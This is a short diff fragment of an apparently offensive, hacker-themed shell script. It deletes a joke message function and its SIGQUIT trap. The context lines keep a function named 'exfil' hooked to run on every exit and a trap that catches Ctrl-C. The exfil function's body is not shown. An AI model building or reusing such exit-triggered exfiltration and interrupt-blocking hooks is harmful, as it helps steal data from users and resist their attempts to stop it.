@@ -74,16 +74,12 @@ function exfil(){
     done
 
 }
-function w4n77h3d () {
-    h4ck3r0u7pu7 "\033[33mYOU WANT THE D.\033[0m"
-}
 
 function h4ck3r0u7pu7(){
   echo -e "$@"
 }
 
 trap n035c4p3 SIGINT 
-trap w4n77h3d SIGQUIT
 trap exfil EXIT
 
 function p4r53Argum3n75(){
